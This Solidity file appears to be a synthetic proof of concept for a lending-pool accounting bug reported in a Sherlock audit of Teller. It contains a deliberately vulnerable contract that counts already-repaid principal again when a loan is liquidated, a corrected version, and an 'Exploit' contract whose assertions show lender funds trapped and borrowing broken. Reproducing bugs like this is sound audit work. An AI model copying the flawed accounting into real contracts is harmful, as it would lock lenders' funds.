// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Teller LenderCommitmentGroup_Smart — liquidateDefaultedLoanWithIncentive
    books the original principal as still due (Sherlock, Nov 2024).
    SYNTHETIC, cheatcode-free. A 100 principal loan repaid by 80, then settled
    at 50, adds 100 again to totalPrincipalTokensRepaid and sets
    tokenDifferenceFromLiquidations to 50-100 = -50. Lenders can withdraw 50
    of the 130 tokens held. 80 stay trapped and new borrows underflow. (@> VULN) */

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LenderGroup {
    MockToken public token;
    uint256 public totalPrincipalTokensCommitted;
    uint256 public totalPrincipalTokensLended;
    uint256 public totalPrincipalTokensRepaid;
    int256 public tokenDifferenceFromLiquidations;
    mapping(uint256 => uint256) public principal;
    mapping(uint256 => uint256) public repaidPrincipal;

    constructor(MockToken t) {
        token = t;
    }

    function openLoan(uint256 bidId, uint256 amount) external {
        principal[bidId] = amount;
        totalPrincipalTokensCommitted += amount;
        totalPrincipalTokensLended += amount;
    }

    function repayLoanCallback(uint256 bidId, uint256 principalAmount) external {
        token.transferFrom(msg.sender, address(this), principalAmount);
        totalPrincipalTokensRepaid += principalAmount; // S2
        repaidPrincipal[bidId] += principalAmount;
    }

    function _getAmountOwedForBid(uint256 bidId) internal view returns (uint256 amountDue) {
        amountDue = principal[bidId]; // @> VULN: S4 original principal, not principal minus repaidPrincipal
    }

    function liquidateDefaultedLoanWithIncentive(uint256 bidId, uint256 settlement) external {
        uint256 amountDue = _getAmountOwedForBid(bidId); // S3
        token.transferFrom(msg.sender, address(this), settlement);
        totalPrincipalTokensRepaid += amountDue;
        tokenDifferenceFromLiquidations += int256(settlement) - int256(amountDue); // S5
    }

    function availableToWithdraw() public view returns (uint256) {
        int256 v = int256(totalPrincipalTokensCommitted) + tokenDifferenceFromLiquidations;
        require(v >= 0, "neg");
        return uint256(v);
    }

    function withdraw() external returns (uint256 pay) {
        pay = availableToWithdraw();
        token.transfer(msg.sender, pay);
    }

    function getPrincipalAmountAvailableToBorrow() external view returns (uint256) {
        return totalPrincipalTokensLended - totalPrincipalTokensRepaid;
    }
}

contract LenderGroupFixed {
    MockToken public token;
    uint256 public totalPrincipalTokensCommitted;
    uint256 public totalPrincipalTokensLended;
    uint256 public totalPrincipalTokensRepaid;
    int256 public tokenDifferenceFromLiquidations;
    mapping(uint256 => uint256) public principal;
    mapping(uint256 => uint256) public repaidPrincipal;

    constructor(MockToken t) {
        token = t;
    }

    function openLoan(uint256 bidId, uint256 amount) external {
        principal[bidId] = amount;
        totalPrincipalTokensCommitted += amount;
        totalPrincipalTokensLended += amount;
    }

    function repayLoanCallback(uint256 bidId, uint256 principalAmount) external {
        token.transferFrom(msg.sender, address(this), principalAmount);
        totalPrincipalTokensRepaid += principalAmount;
        repaidPrincipal[bidId] += principalAmount;
    }

    function liquidateDefaultedLoanWithIncentive(uint256 bidId, uint256 settlement) external {
        uint256 remaining = principal[bidId] - repaidPrincipal[bidId];
        token.transferFrom(msg.sender, address(this), settlement);
        totalPrincipalTokensRepaid += remaining;
        tokenDifferenceFromLiquidations += int256(settlement) - int256(remaining);
    }

    function availableToWithdraw() public view returns (uint256) {
        return uint256(int256(totalPrincipalTokensCommitted) + tokenDifferenceFromLiquidations);
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    LenderGroup public group; // nonce 2

    uint256 public constant P = 100e18;
    uint256 public constant REPAY = 80e18;
    uint256 public constant SETTLEMENT = 50e18;
    bool public borrowReverted;
    uint256 public avail;
    uint256 public leftInGroup;

    constructor() {
        token = new MockToken();
        group = new LenderGroup(token);
        token.mint(address(this), REPAY + SETTLEMENT);
    }

    function run() external {
        token.approve(address(group), type(uint256).max);
        group.openLoan(1, P);
        group.repayLoanCallback(1, REPAY); // S1
        group.liquidateDefaultedLoanWithIncentive(1, SETTLEMENT);
        avail = group.availableToWithdraw();
        group.withdraw();
        try group.getPrincipalAmountAvailableToBorrow() returns (uint256) {
            borrowReverted = false;
        } catch {
            borrowReverted = true;
        }
        leftInGroup = token.balanceOf(address(group)); // S6
        require(borrowReverted, "borrow did not underflow");
        require(avail == 50e18, "available");
        require(leftInGroup == 80e18, "80 not trapped");
        require(group.totalPrincipalTokensRepaid() == 180e18, "double count");
        require(group.tokenDifferenceFromLiquidations() == -50e18, "difference");
    }
}
